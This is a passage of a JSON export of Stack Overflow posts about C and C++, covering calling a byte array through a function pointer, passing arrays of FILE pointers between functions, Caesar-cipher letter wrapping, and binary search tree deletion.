"https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437595524, "post_id": 31571582, "comment_id": 51100708, "body": "I would say they very well have an answer: <b>don&#39;t do it!</b> They just call it a bit more friendly: <i>undefined behaviour</i>. And, no: UB does not vary, that would be <i>implementation defined</i>. Once UB is invoked, there is no use in investigating further."}], "tags": [], "owner": {"reputation": 159118, "user_id": 15416, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/a2b11b9662b5155aada74191fbe7cb9e?s=128&d=identicon&r=PG", "display_name": "MSalters", "link": "https://stackoverflow.com/users/15416/msalters"}, "is_accepted": false, "score": 1, "last_activity_date": 1437590991, "creation_date": 1437590991, "answer_id": 31571582, "question_id": 31570646, "link": "https://stackoverflow.com/questions/31570646/need-chars-to-void-function-its-address/31571582#31571582", "title": "Need chars to void function its address?", "body": "<p>Perhaps.</p>\n\n<p>The C standard nor the C++ standard have an answer to this. For both of them, it's Undefined Behavior. It might vary from implementation to implementation, if it's even possible.</p>\n\n<p>If you give us a specific compiler, we might be able to answer it.</p>\n"}], "owner": {"reputation": 187, "user_id": 4812957, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/8f86977dd7413222c45aa1aa7cf11d54?s=128&d=identicon&r=PG&f=1", "display_name": "Joe", "link": "https://stackoverflow.com/users/4812957/joe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 95, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1437590991, "creation_date": 1437587958, "question_id": 31570646, "link": "https://stackoverflow.com/questions/31570646/need-chars-to-void-function-its-address", "title": "Need chars to void function its address?", "body": "<p>Need I specify the address of the char array opcodes (&amp;opcodes)? I'm casting to a void pointer, then I see indeed specify again the address (fp points address to opcodes -> points to opcodes).</p>\n\n<pre><code>char opcodes[] = \"\\x41\\x41...\";\n\nvoid main()\n{\n    void(*fp) (void);\n    fp = (void *)&amp;opcodes; // opcodes or &amp;opcodes\n    fp();\n}\n</code></pre>\n"}, {"tags": ["c", "file", "pointers"], "comments": [{"owner": {"reputation": 15946, "user_id": 4606734, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/858769040849894/picture?type=large", "display_name": "ameyCU", "link": "https://stackoverflow.com/users/4606734/ameycu"}, "edited": false, "score": 0, "creation_date": 1437587594, "post_id": 31570409, "comment_id": 51095865, "body": "Compile and debug to see any error ."}, {"owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "edited": false, "score": 0, "creation_date": 1437587982, "post_id": 31570409, "comment_id": 51096092, "body": "Are you asking for a review of the code to help you diagnose potential problems?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1437587986, "post_id": 31570409, "comment_id": 51096095, "body": "I can&#39;t imagine why you would use a <code>(FILE **)[]</code> for this.  A <code>(FILE *)[]</code> should be perfectly adequate.  As for examining your code for problems, you&#39;ve posted in the wrong place.  You want <a href=\"http://codereview.stackexchange.com/\">codereview.stackexchange.com</a>."}, {"owner": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 0, "creation_date": 1437588146, "post_id": 31570409, "comment_id": 51096181, "body": "I haven&#39;t read the code, but notice that <code>FILE* pfFile[]</code> is equivalent to <code>FILE **pfFile</code>, which is basically a pointer to a pointer to a FILE (a 2D FILE array). And <code>FILE** pfFile[]</code> is a 3D array."}, {"owner": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "edited": false, "score": 0, "creation_date": 1437588197, "post_id": 31570409, "comment_id": 51096217, "body": "Basically an array of FILE pointers should be all you need."}, {"owner": {"reputation": 1, "user_id": 3679858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f267229144447aea2267c92a90e36af9?s=128&d=identicon&r=PG&f=1", "display_name": "Jaime Daviu", "link": "https://stackoverflow.com/users/3679858/jaime-daviu"}, "edited": false, "score": 0, "creation_date": 1437643504, "post_id": 31570409, "comment_id": 51119206, "body": "AmeyCU, I have compiled and tested and gives no warning or error. R Sahu, yes I would like help to diagnose potential problems, as I&#39;would like to know if my c level is enough. What I mean is, as you add a level of pointer every time you send a reference to a function, e.g. if you have *pPerson, inside a function you will add a level of pointer (**pPerson). I was thinking that if I have FIILE * pMyFiles[3] (the first pointer is beacause the standard and the [3] because I want 3), then, using it inside a function, SHOULD I add a level of pointer every time I call a function from inside another?"}, {"owner": {"reputation": 1, "user_id": 3679858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f267229144447aea2267c92a90e36af9?s=128&d=identicon&r=PG&f=1", "display_name": "Jaime Daviu", "link": "https://stackoverflow.com/users/3679858/jaime-daviu"}, "edited": false, "score": 0, "creation_date": 1437649111, "post_id": 31570409, "comment_id": 51122811, "body": "R Sahu, I&#39;ve just discovered an answer you gave the  3th october 2014 to the question &quot; Returning multiple file pointers in C &quot;. I think it could be a solution if I can&#39;t understand my pointers problem."}], "answers": [{"comments": [{"owner": {"reputation": 7645, "user_id": 2692339, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/4f8e4e5cba3b6606d8e395364c1742b8?s=128&d=identicon&r=PG&f=1", "display_name": "edmz", "link": "https://stackoverflow.com/users/2692339/edmz"}, "edited": false, "score": 1, "creation_date": 1437589680, "post_id": 31570945, "comment_id": 51097120, "body": "It is equivalent when array-to-pointer conversions take place, otherwise they&#39;re two different types."}], "tags": [], "owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "is_accepted": false, "score": 2, "last_activity_date": 1437595907, "last_edit_date": 1437595907, "creation_date": 1437588942, "answer_id": 31570945, "question_id": 31570409, "link": "https://stackoverflow.com/questions/31570409/array-of-file-through-functions-file-or-file/31570945#31570945", "title": "Array of FILE* through functions: FILE* or FILE**?", "body": "<p>A single file handle is a pointer to <code>FILE</code>, i.e., <code>FILE *</code>. Since you want an array of these <code>FILE *</code> elements, the pointer to the array is <code>FILE **arr</code>, which is equivalent to <code>FILE *arr[]</code> when used as the type of a parameter to a function.</p>\n"}], "owner": {"reputation": 1, "user_id": 3679858, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f267229144447aea2267c92a90e36af9?s=128&d=identicon&r=PG&f=1", "display_name": "Jaime Daviu", "link": "https://stackoverflow.com/users/3679858/jaime-daviu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 60, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1437595907, "creation_date": 1437587334, "last_edit_date": 1437587602, "question_id": 31570409, "link": "https://stackoverflow.com/questions/31570409/array-of-file-through-functions-file-or-file", "title": "Array of FILE* through functions: FILE* or FILE**?", "body": "<p>I'm trying to make a program which can work with several different files at the same time. My idea is to make an array of 20 FILE* in order to, if ever I arrive to this limit, to be able of closing one of them and open the new file requested. \n    For this purpose I've thought in a function that selects an option and calls another that makes the job of saving (writing), closing and opening.\n    After half week of searching through the web and making some proves, I've made two versions that seem to work: one with FILE* and another with FILE**.</p>\n\n<p>My question is: if some of them has a mistake that I can't detect or a bad use of pointers when passing through these two functions.</p>\n\n<p>(The code I display have the two versions of the two functions one after another.)</p>\n\n<pre><code>MyProgram() {\n\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;string.h&gt;\n\n/* The contents of myFile1a.dat, myFile2b.dat,... are just 5 ints. */\n\n\n/* Version without pointer to pointer. */\nvoid fReadFile(FILE* pfFile[]) {\n    int i = 0, j = 0;\n    int iNums[15] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\n    int iNums2[15] = {5001, 5002, 5003, 5004, 5005, 2033, 2066, 2099, 2133, 2166, 3001, 3002, 3003, 3004, 3005};\n    char cNameFile4d[32] = \"myFile4d.dat\", cNameFile5e[32] = \"myFile5e.dat\";   \n    char cNameFile6f[32] = \"myFile6f.dat\";\n    char cNameFile[32] = {\" \"};\n    int iResultFclose = 0;\n\n    for(i=0; i&lt;5; i++) {\n        fread(&amp;iNums[i], 4, 1, pfFile[0]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=5; i&lt;10; i++) {\n        fread(&amp;iNums[i], 4, 1, pfFile[1]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=10; i&lt;15; i++) {\n        fread(&amp;iNums[i], 4, 1, pfFile[2]);\n        printf(\"\\n%d\", iNums[i]);\n    }\n\n    iResultFclose = fclose(pfFile[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose(pfFile[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 1.\");\n    iResultFclose = fclose(pfFile[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 2.\");\n\n    strcpy(cNameFile, cNameFile4d);\n    pfFile[0] = fopen(cNameFile, \"wb\");\n    for(i=0; i&lt;5; i++)\n        fwrite(&amp;iNums2[i], 4, 1, pfFile[0]);\n    strcpy(cNameFile, cNameFile5e);\n    pfFile[1] = fopen(cNameFile, \"wb\");\n    for(i=5; i&lt;10; i++)\n        fwrite(&amp;iNums2[i], 4, 1, pfFile[1]);\n    strcpy(cNameFile, cNameFile6f);\n    pfFile[2] = fopen(cNameFile, \"wb\");\n    for(i=10; i&lt;15; i++)\n        fwrite(&amp;iNums2[i], 4, 1, pfFile[2]);\n\n    iResultFclose = fclose(pfFile[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose(pfFile[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 1.\");\n    iResultFclose = fclose(pfFile[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 2.\");\n\n    strcpy(cNameFile, cNameFile4d);\n    pfFile[0] = fopen(cNameFile, \"rb\");\n    strcpy(cNameFile, cNameFile5e);\n    pfFile[1] = fopen(cNameFile, \"rb\");\n    strcpy(cNameFile, cNameFile6f);\n    pfFile[2] = fopen(cNameFile, \"rb\");\n\n    for(i=0; i&lt;5; i++) {\n        fread(&amp;iNums[i], 4, 1, pfFile[0]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=5; i&lt;10; i++) {\n        fread(&amp;iNums[i], 4, 1, pfFile[1]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=10; i&lt;15; i++) {\n        fread(&amp;iNums[i], 4, 1, pfFile[2]);\n        printf(\"\\n%d\", iNums[i]);\n    }\n\n    iResultFclose = fclose(pfFile[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose(pfFile[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose(pfFile[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n}\n\n/* Version with pointer to pointer. */\nvoid fReadFile(FILE** pfFile[]) {\n    int i = 0, j = 0;\n\n    int iNums[15] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};\n    int iNums2[15] = {5001, 5002, 5003, 5004, 5005, 2033, 2066, 2099, 2133, 2166, 3001, 3002, 3003, 3004, 3005};\n    char cNameFile4d[32] = \"myFile4d.dat\", cNameFile5e[32] = \"myFile5e.dat\", cNameFile6f[32] = \"myFile6f.dat\";\n    char cNameFile[32] = {\" \"};\n    int iResultFclose = 0;\n\n    for(i=0; i&lt;5; i++) {\n        fread(&amp;iNums[i], 4, 1, (*pfFile)[0]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=5; i&lt;10; i++) {\n        fread(&amp;iNums[i], 4, 1, (*pfFile)[1]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=10; i&lt;15; i++) {\n        fread(&amp;iNums[i], 4, 1, (*pfFile)[2]);\n        printf(\"\\n%d\", iNums[i]);\n    }\n\n    iResultFclose = fclose((*pfFile)[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose((*pfFile)[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 1.\");\n        iResultFclose = fclose((*pfFile)[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 2.\");\n\n    strcpy(cNameFile, cNameFile4d);\n    (*pfFile)[0] = fopen(cNameFile, \"wb\");\n    for(i=0; i&lt;5; i++)\n        fwrite(&amp;iNums2[i], 4, 1, (*pfFile)[0]);\n    strcpy(cNameFile, cNameFile5e);\n    (*pfFile)[1] = fopen(cNameFile, \"wb\");\n    for(i=5; i&lt;10; i++)\n        fwrite(&amp;iNums2[i], 4, 1, (*pfFile)[1]);\n    strcpy(cNameFile, cNameFile6f);\n    (*pfFile)[2] = fopen(cNameFile, \"wb\");\n    for(i=10; i&lt;15; i++)\n        fwrite(&amp;iNums2[i], 4, 1, (*pfFile)[2]);\n\n    iResultFclose = fclose((*pfFile)[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose((*pfFile)[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 1.\");\n    iResultFclose = fclose((*pfFile)[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 2.\");\n\n    strcpy(cNameFile, cNameFile4d);\n    (*pfFile)[0] = fopen(cNameFile, \"rb\");\n    strcpy(cNameFile, cNameFile5e);\n    (*pfFile)[1] = fopen(cNameFile, \"rb\");\n    strcpy(cNameFile, cNameFile6f);\n    (*pfFile)[2] = fopen(cNameFile, \"rb\");\n\n    for(i=0; i&lt;5; i++) {\n        fread(&amp;iNums[i], 4, 1, (*pfFile)[0]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=5; i&lt;10; i++) {\n        fread(&amp;iNums[i], 4, 1, (*pfFile)[1]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=10; i&lt;15; i++) {\n        fread(&amp;iNums[i], 4, 1, (*pfFile)[2]);\n        printf(\"\\n%d\", iNums[i]);\n    }\n\n    iResultFclose = fclose((*pfFile)[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose((*pfFile)[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose((*pfFile)[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n}\n\n/* Version without \"&amp;\" in the caller. */\nvoid fOptions(FILE* pfFileOpc[], int option) {\n    int i = 0;\n    switch (option)\n    {\n        case 1: {fReadFile(pfFileOpc); break;}\n        case 2: {printf(\"\\nHello!\\n\"); break;}\n        default: break;\n    }\n}\n\n/* Version with \"&amp;\" in the caller. */\nvoid fOptions(FILE* pfFileOpc[], int option) {\n    int i = 0;\n    switch (option)\n    {\n        case 1: {fReadFile(&amp;pfFileOpc); break;}\n        case 2: {printf(\"\\nHello!\\n\"); break;}\n        default: break;\n    }\n}\n\nint main() {\n    FILE *pFile[3];\n    int i = 0, j = 0, option = 0, iResultFclose = 0;\n\n    char cNameFile[32] = {\" \"};\n    char cNameFile1a[32] = \"myFile1a.dat\", cNameFile2b[32] = \"myFile2b.dat\";\n    char cNameFile3c[32] = \"myFile3c.dat\", cNameFile4d[32] = \"myFile4d.dat\";\n    char cNameFile5e[32] = \"myFile5e.dat\",  cNameFile6f[32] = \"myFile6f.dat\";\n\n    int iNums[15] = {2001, 2002, 2003, 2004, 2005, 2033, 2066, 2099,  2133, 2166, 3001, 3002, 3003, 3004, 3005};\n    int iNums2[15] = {5001, 5002, 5003, 5004, 5005, 2033, 2066, 2099,  2133, 2166, 3001, 3002, 3003, 3004, 3005};\n\n    strcpy(cNameFile, cNameFile1a);\n    pFile[0] = fopen(cNameFile, \"rb\");\n    if (!pFile[0])\n        puts(\"Error opening the file1a\");\n    strcpy(cNameFile, cNameFile2b);\n    pFile[1] = fopen(cNameFile, \"rb\");\n    if (!pFile[1])\n        puts(\"Error opening the file2b\");\n    strcpy(cNameFile, cNameFile3c);\n    pFile[2] = fopen(cNameFile, \"rb\");\n    if (!pFile[2])\n        puts(\"Error opening the file3c\");\n\n    printf(\"\\nWrite an option: \\n\");\n    scanf(\"%d\", &amp;option);\n    fOptions(pFile, option);\n\n    puts(\"\\n\\nAnd we foooooolow....... \\n\\n\");\n\n    strcpy(cNameFile, cNameFile1a);\n    pFile[0] = fopen(cNameFile, \"rb\");\n    if (!pFile[0])\n        puts(\"Error opening the file1a\");\n    strcpy(cNameFile, cNameFile2b);\n    pFile[1] = fopen(cNameFile, \"rb\");\n    if (!pFile[1])\n        puts(\"Error opening the file2b\");\n    strcpy(cNameFile, cNameFile3c);\n    pFile[2] = fopen(cNameFile, \"rb\");\n    if (!pFile[2])\n        puts(\"Error opening the file3c\");\n\n    for(i=0; i&lt;5; i++) {\n        fread(&amp;iNums[i], 4, 1, pFile[0]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=5; i&lt;10; i++) {\n        fread(&amp;iNums[i], 4, 1, pFile[1]);\n        printf(\"\\n%d\",iNums[i]);\n    }\n    for(i=10; i&lt;15; i++) {\n        fread(&amp;iNums[i], 4, 1, pFile[2]);\n        printf(\"\\n%d\", iNums[i]);\n    }\n\n    iResultFclose = fclose(pFile[0]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 0.\");\n    iResultFclose = fclose(pFile[1]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 1.\");\n    iResultFclose = fclose(pFile[2]);\n    if (iResultFclose != 0)\n        puts(\"Error closing the file 2.\");\n\n    return 0;\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Many thanks in advance.</p>\n"}, {"tags": ["c++", "c", "ascii"], "comments": [{"owner": {"reputation": 13191, "user_id": 4990642, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/xY0PD.jpg?s=128&g=1", "display_name": "snr", "link": "https://stackoverflow.com/users/4990642/snr"}, "edited": false, "score": 0, "creation_date": 1437588078, "post_id": 31570396, "comment_id": 51096140, "body": "Simple google search and this <a href=\"http://www.cs.trincoll.edu/~crypto/historical/caesar.html\" rel=\"nofollow noreferrer\">link</a> help you. Why have you asked before searching ?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437596548, "post_id": 31570396, "comment_id": 51101360, "body": "Code has additional issues if <code>k &lt; 0</code>.  Suggest <code>k %= 26; if (k &lt; 0) k += 26;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437596274, "post_id": 31570580, "comment_id": 51101181, "body": "This will have trouble with <code>k&lt;0</code>.  But maybe OP does not care about that."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1437597009, "post_id": 31570580, "comment_id": 51101675, "body": "Note: <code>c = &#39;a&#39; + (c % &#39;z&#39;) - 1</code> is only doing a <code>c -= (&#39;z&#39;-&#39;a&#39;+1)</code> or <code>c -= 26</code>.  IMO, one of these 2 would be clearer."}], "tags": [], "owner": {"reputation": 149509, "user_id": 4342498, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/l3j88.jpg?s=128&g=1", "display_name": "NathanOliver", "link": "https://stackoverflow.com/users/4342498/nathanoliver"}, "is_accepted": true, "score": 2, "last_activity_date": 1437589005, "last_edit_date": 1437589005, "creation_date": 1437587789, "answer_id": 31570580, "question_id": 31570396, "link": "https://stackoverflow.com/questions/31570396/wrapping-chars-in-caesar-cipher-encode/31570580#31570580", "title": "Wrapping chars in caesar cipher encode", "body": "<p>Lets make a couple changes to the code and it is easier to see what is going on</p>\n\n<pre><code>for(int i = 0; i &lt; n; i++){\n    int c = s[i];\n    if(c &gt;= 'a' &amp;&amp; c &lt;= 'z'){\n        c += k;\n        if( c &gt; 'z'){\n            c = 'a' + (c % 'z') - 1; // wrapping from z to a?\n        }\n    }\n    else if(c &gt;= 'A' &amp;&amp; c &lt;= 'Z'){\n        c += k;\n        if(c &gt; 'Z'){\n            c = 'A' + (c % 'Z') - 1;\n        }\n    }\n    cout &lt;&lt; (char)c;\n}\n</code></pre>\n\n<p>So in <code>c = 'a' + (c % 'z') - 1;</code> if <code>c</code> is larger than <code>z</code> then we mod <code>c</code> by <code>z</code>(122) to get how many characters from <code>a</code> we need to go.  The same thing is going on with the upper case letters.  I am subtracting one here as we are starting at <code>a</code> instead of the character before <code>a</code> like you original code does.</p>\n"}], "owner": {"reputation": 384, "user_id": 3801406, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/dcaa4596dfcbd114ed233ac0182042f9?s=128&d=identicon&r=PG&f=1", "display_name": "bittterbotter", "link": "https://stackoverflow.com/users/3801406/bittterbotter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 575, "favorite_count": 1, "accepted_answer_id": 31570580, "answer_count": 1, "score": -1, "last_activity_date": 1437589005, "creation_date": 1437587302, "question_id": 31570396, "link": "https://stackoverflow.com/questions/31570396/wrapping-chars-in-caesar-cipher-encode", "title": "Wrapping chars in caesar cipher encode", "body": "<p>Can anyone please explain me how this wrapping of chars between a-to-z and A-to-Z happening in Caesar shift code?</p>\n\n<pre><code>k %= 26;\n\nfor(int i = 0; i &lt; n; i++){\n    int c = s[i];\n    if(c &gt;= 'a' &amp;&amp; c &lt;= 'z'){\n        c += k;\n        if( c &gt; 'z'){\n            c = 96 + (c % 122); // wrapping from z to a?\n        }\n    }\n    else if(c &gt;= 'A' &amp;&amp; c &lt;= 'Z'){\n        c += k;\n        if(c &gt; 'Z'){\n            c = 64 + (c % 90);\n        }\n    }\n    cout &lt;&lt; (char)c;\n}\n</code></pre>\n\n<p>K is amount of shift and c is a char of string s.</p>\n\n<p>Is there any better way to do the same?</p>\n"}, {"tags": ["c", "binary-search-tree"], "comments": [{"owner": {"reputation": 650, "user_id": 5061723, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/812dfad842a1c235d23f5ab4d7f6ff9d?s=128&d=identicon&r=PG&f=1", "display_name": "Isaiah", "link": "https://stackoverflow.com/users/5061723/isaiah"}, "edited": false, "score": 1, "creation_date": 1437586767, "post_id": 31570186, "comment_id": 51095382, "body": "<code>*temp = root-&gt;left;</code> then <b><code>free(root)</code></b> then returning temp does not result n a null pointer"}], "answers": [{"comments": [{"owner": {"reputation": 17, "user_id": 4389001, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/fcee0ecafcb6eff6c11bad2a438c5fd6?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/4389001/mahesh"}, "edited": false, "score": 0, "creation_date": 1437960758, "post_id": 31570500, "comment_id": 51234110, "body": "Yes I know about this but the question arised to me when I try to print &quot;temp-&gt;data&quot; before return(temp) and my program stops. Please check printing temp-&gt;data before return statement and give me your comment."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1437587568, "creation_date": 1437587568, "answer_id": 31570500, "question_id": 31570186, "link": "https://stackoverflow.com/questions/31570186/binary-tree-deletion-cannot-understand-some-pointers/31570500#31570500", "title": "Binary tree deletion-cannot understand some pointers", "body": "<p>The code you are inquiring about is part of the code handling the case that the node to delete is the root node of the tree.  It checks whether the root node has only one child (or zero), in which case the deletion can be performed simply by making the one child the new root of the tree.</p>\n\n<p>Note in particular that when <code>root-&gt;left == NULL</code> it is the <strong>right</strong> child, not the left one, that is chosen as the new root (and temporarily recorded in <code>temp</code>), and vice versa.  Either way, the original root node is freed since it is no longer in the tree, and will not be accessible via the new root pointer that the function is about to return.</p>\n\n<p>The function returns <code>NULL</code> only when the root node is initially the only node in the tree.</p>\n"}], "owner": {"reputation": 17, "user_id": 4389001, "user_type": "registered", "accept_rate": 40, "profile_image": "https://www.gravatar.com/avatar/fcee0ecafcb6eff6c11bad2a438c5fd6?s=128&d=identicon&r=PG&f=1", "display_name": "mahesh", "link": "https://stackoverflow.com/users/4389001/mahesh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 228, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1440628127, "creation_date": 1437586551, "last_edit_date": 1440628127, "question_id": 31570186, "link": "https://stackoverflow.com/questions/31570186/binary-tree-deletion-cannot-understand-some-pointers", "title": "Binary tree deletion-cannot understand some pointers", "body": "<p>I have a doubt in this binary tree deletion.The code is</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\nstruct node\n{\n    int key;\n    struct node *left, *right;\n};\nstruct node *newNode(int item)\n{\n    struct node *temp =  (struct node *)malloc(sizeof(struct node));\n    temp-&gt;key = item;\n    temp-&gt;left = temp-&gt;right = NULL;\n    return temp;\n}\nvoid inorder(struct node *root)\n{\n    if (root != NULL)\n    {\n        inorder(root-&gt;left);\n        printf(\"%d \", root-&gt;key);\n        inorder(root-&gt;right);\n    }\n}\nstruct node* insert(struct node* node, int key)\n{\n    if (node == NULL) return newNode(key);\n\n    if (key &lt; node-&gt;key)\n        node-&gt;left  = insert(node-&gt;left, key);\n    else\n        node-&gt;right = insert(node-&gt;right, key);\n    return node;\n}\nstruct node * minValueNode(struct node* node)\n{\n    struct node* current = node;\n     while (current-&gt;left != NULL)\n        current = current-&gt;left;\n\n    return current;\n}\nstruct node* deleteNode(struct node* root, int key)\n{\n   if (root == NULL) return root;\n\n   if (key &lt; root-&gt;key)\n        root-&gt;left = deleteNode(root-&gt;left, key);\n     else if (key &gt; root-&gt;key)\n        root-&gt;right = deleteNode(root-&gt;right, key);\n   else\n    {\n        if (root-&gt;left == NULL)\n        {\n            struct node *temp = root-&gt;right;\n            free(root);\n            return temp;\n        }\n        else if (root-&gt;right == NULL)\n        {\n            struct node *temp = root-&gt;left;\n            free(root);\n            return temp;\n        }\n\n    struct node* temp = minValueNode(root-&gt;right);\n\n         root-&gt;key = temp-&gt;key;\n\n       root-&gt;right = deleteNode(root-&gt;right, temp-&gt;key);\n    }\n    return root;\n}\n\nint main()\n{\n    struct node *root = NULL;\n    root = insert(root, 50);\n    root = insert(root, 30);\n    root = insert(root, 20);\n    root = insert(root, 40);\n    root = insert(root, 70);\n    root = insert(root, 60);\n    root = insert(root, 80);\n\n    printf(\"Inorder traversal of the given tree \\n\");\n    inorder(root);\n\n    printf(\"\\nDelete 20\\n\");\n    root = deleteNode(root, 20);\n    printf(\"Inorder traversal of the modified tree \\n\");\n    inorder(root);\n\n    printf(\"\\nDelete 30\\n\");\n    root = deleteNode(root, 30);\n    printf(\"Inorder traversal of the modified tree \\n\");\n    inorder(root);\n\n    printf(\"\\nDelete 50\\n\");\n    root = deleteNode(root, 50);\n    printf(\"Inorder traversal of the modified tree \\n\");\n    inorder(root);\n\n    return 0;\n}\n</code></pre>\n\n<p>The lines which I cannot understand is:</p>\n\n<pre><code>if (root-&gt;left == NULL)\n        {\n            struct node *temp = root-&gt;right;\n            free(root);\n            return temp;\n        }\n        else if (root-&gt;right == NULL)\n        {\n            struct node *temp = root-&gt;left;\n            free(root);\n            return temp;\n        }\n</code></pre>\n\n<p>is this code actually return NULL value then can I rewrite the code as <strong>struct node *temp=NULL</strong> in both the cases but the last inorder value is not displayed when i do this.</p>\n"}, {"tags": ["c", "linux", "bash"], "comments": [{"owner": {"reputation": 68627, "user_id": 258523, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/102329bab02333104708ac179f35fd8d?s=128&d=identicon&r=PG&f=1", "display_name": "Etan Reisner", "link": "https://stackoverflow.com/users/258523/etan-reisner"}, "edited": false, "score": 0, "creation_date": 1437586053, "post_id": 31570029, "comment_id": 